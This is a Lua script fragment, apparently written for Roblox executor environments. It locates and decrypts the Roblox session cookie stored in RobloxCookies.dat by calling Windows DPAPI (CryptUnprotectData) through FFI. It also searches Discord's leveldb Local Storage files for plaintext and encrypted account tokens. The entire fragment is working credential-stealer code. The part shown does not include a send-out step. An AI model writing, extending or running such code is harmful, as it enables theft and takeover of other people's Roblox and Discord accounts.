-- ─── readers ────────────────────────────────────────────────
local READERS, LISTERS = {}, {}
do
    local seenR, seenL = {}, {}
    local function addR(name, fn) if type(fn)=="function" and not seenR[name] then seenR[name]=true; READERS[#READERS+1]={name,fn} end end
    local function addL(name, fn) if type(fn)=="function" and not seenL[name] then seenL[name]=true; LISTERS[#LISTERS+1]={name,fn} end end
    if type(readfile) == "function" then addR("readfile", readfile) end
    if type(listfiles) == "function" then addL("listfiles", listfiles) end
    if type(syn) == "table" then
        if type(syn.readfile) == "function" then addR("syn.readfile", syn.readfile) end
        if type(syn.listfiles) == "function" then addL("syn.listfiles", syn.listfiles) end
    end
    if type(readfile2) == "function" then addR("readfile2", readfile2) end
end
local function readAny(path)
    for _, r in ipairs(READERS) do
        local ok, content = pcall(r[2], path)
        if ok and type(content) == "string" and #content > 0 then return content, r[1] end
    end
    return nil
end
local function listAny(path)
    for _, l in ipairs(LISTERS) do
        local ok, out = pcall(l[2], path)
        if ok and type(out) == "table" then return out end
    end
    return nil
end

-- ─── windows DPAPI ──────────────────────────────────────────
local WinSurf = { ready=false }
if PLATFORM == "windows" and HAS_FFI then
    pcall(function()
        local ffi_ = ffi
        pcall(ffi_.cdef[[
            typedef struct { int cbData; unsigned char *pbData; } DATA_BLOB;
            int CryptUnprotectData(DATA_BLOB *pDataIn, void *ppszDataDescr,
                DATA_BLOB *pOptionalEntropy, void *pvReserved,
                void *pPromptStruct, int dwFlags, DATA_BLOB *pDataOut);
            void LocalFree(void *hMem);
        ]])
        local kernel32 = ffi_.load("kernel32")
        local crypt32  = ffi_.load("crypt32")
        local function dpapiUnprotect(b64)
            local clean = tostring(b64):gsub("%s","")
            local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
            local map = {}; for i = 1, #b do map[b:sub(i,i)] = i-1 end
            local out = {}; local buf = 0; local bits = 0
            for i = 1, #clean do
                local c = clean:sub(i,i); if c == "=" then break end
                local v = map[c]; if v == nil then return nil end
                buf = buf * 64 + v; bits = bits + 6
                if bits >= 8 then bits = bits - 8; out[#out+1] = string.char(math.floor(buf / (2 ^ bits)) % 256) end
            end
            local raw = table.concat(out); if #raw == 0 then return nil end
            local inBlob  = ffi_.new("DATA_BLOB"); local outBlob = ffi_.new("DATA_BLOB")
            inBlob.cbData = #raw
            inBlob.pbData = ffi_.cast("unsigned char*", ffi_.new("char[?]", #raw))
            ffi_.copy(inBlob.pbData, raw, #raw)
            local ok = crypt32.CryptUnprotectData(inBlob, nil, nil, nil, nil, 0, outBlob)
            if ok == 0 then return nil end
            local plain = ffi_.string(outBlob.pbData, outBlob.cbData)
            kernel32.LocalFree(outBlob.pbData)
            return plain
        end
        WinSurf.dpapiUnprotect = dpapiUnprotect
        WinSurf.ready = true
    end)
    log("win", WinSurf.ready and "[ok] DPAPI" or "[FAIL] DPAPI")
end

local function findRobloxCookieWindows()
    if not WinSurf.ready then return { found=false, reason="ffi/DPAPI unavailable" } end
    local path = os.getenv("LOCALAPPDATA") and (os.getenv("LOCALAPPDATA").."\\Roblox\\LocalStorage\\RobloxCookies.dat")
    if not path then return { found=false, reason="LOCALAPPDATA unset" } end
    local content = readAny(path)
    if not content then return { found=false, reason="RobloxCookies.dat not readable" } end
    local t = decode(content)
    if type(t) ~= "table" then return { found=false, reason="not json" } end
    for _, entry in pairs(t) do
        if type(entry) == "table" and type(entry.Data) == "string" then
            local plain = WinSurf.dpapiUnprotect(entry.Data)
            if plain then
                local v = plain:match("[%w%+%/%=%-_%.|]+")
                if v and #v > 20 then
                    return { found=true, method="DPAPI", path=path, rawLen=#content, value=v, account=entry.Name }
                end
            end
        end
    end
    return { found=false, reason="no decryptable entries" }
end

local function findDiscordTokenWindows()
    local base = os.getenv("APPDATA") and (os.getenv("APPDATA").."\\discord\\Local Storage\\leveldb")
    if not base then return { found=false, reason="APPDATA unset" } end
    local list = listAny(base)
    if not list then return { found=false, reason="leveldb not listable" } end
    local hits = {}
    for _, f in ipairs(list) do
        local name = f:match("[^\\/]+$") or f
        if name:find("%.ldb$") or name:find("%.log$") then
            local content = readAny(f)
            if content then
                for tok in content:gmatch("([%w%-%_]+%.[%w%-%_]+%.[%w%-%_]+)") do
                    if #tok > 60 and tok:sub(1, 3):lower() ~= "htt" then
                        hits[#hits+1] = { type="jwt", token=tok, file=f }
                    end
                end
                for enc in content:gmatch("dQw4w9WgXcQ:([%w%+%/%=%-%_%.]+)") do
                    if #enc > 20 then hits[#hits+1] = { type="encrypted", blob=enc, file=f } end
                end
            end
        end
    end
    if #hits == 0 then return { found=false, reason="no tokens" } end
    return { found=true, method="leveldb", hits=hits }
end

